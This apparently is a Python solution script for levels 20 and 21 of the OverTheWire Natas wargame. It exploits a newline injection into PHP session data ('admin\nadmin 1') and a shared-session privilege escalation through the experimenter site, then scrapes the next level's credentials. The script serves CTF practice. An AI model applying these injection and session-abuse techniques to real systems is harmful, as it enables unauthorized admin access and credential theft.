#!/usr/bin/python3

import requests, subprocess, pwinput
from bs4 import BeautifulSoup

def natas20():
    subprocess.run("clear")
    print("\n-------- NATAS20 --------\n")
    user = input("User: ")
    password = pwinput.pwinput(prompt='Password: ', mask='*')
    url = "http://{}.natas.labs.overthewire.org/".format(user)

    #FIRST REQUEST

    key = dict(name='admin\nadmin 1')
    response = requests.get(url, auth=(user, password), params=key)
    sid = response.cookies['PHPSESSID']

    #SECOND REQUEST

    cookies = dict(PHPSESSID=sid)
    response = requests.get(url, auth=(user, password), params=key, cookies=cookies)
    soup = BeautifulSoup(response.text, 'lxml')
    parse = soup.find('pre')
    petition = str(parse.text)
    split = petition.replace(":", " ").replace("\n", " ").split(" ")
    user21 = split[2]
    password21 = split[5]
    print("\n===========================================")
    print("**Password for Natas21**")
    print("Username: " + user21)
    print("Password: " + password21)
    print("===========================================")

    natas21(user21, password21)

def natas21(user21, password21):
    print("\n--------WORKING ON NATAS21--------\n")
    auth = (user21, password21)
    url21 = "http://{}.natas.labs.overthewire.org/".format(user21)
    urlExperimenter = "http://natas21-experimenter.natas.labs.overthewire.org"

    #FIRST REQUEST

    session = requests.session()
    key = dict(submit="Update", admin=1)
    response = session.post(urlExperimenter, params=key, auth=auth)
    sid = session.cookies['PHPSESSID']

    #SECOND REQUEST

    cookies = dict(PHPSESSID=sid)
    response = session.get(url21, cookies=cookies, auth=auth)
    soup = BeautifulSoup(response.text, 'lxml')
    parse = soup.find('pre')
    petition = str(parse.text)
    split = petition.replace(":", " ").replace("\n", " ").split(" ")
    user22 = split[2]
    password22 = split[5]
    print("===========================================")
    print("**Password for Natas22**")
    print("Username: " + user22)
    print("Password: " + password22)
    print("===========================================\n")

natas20()
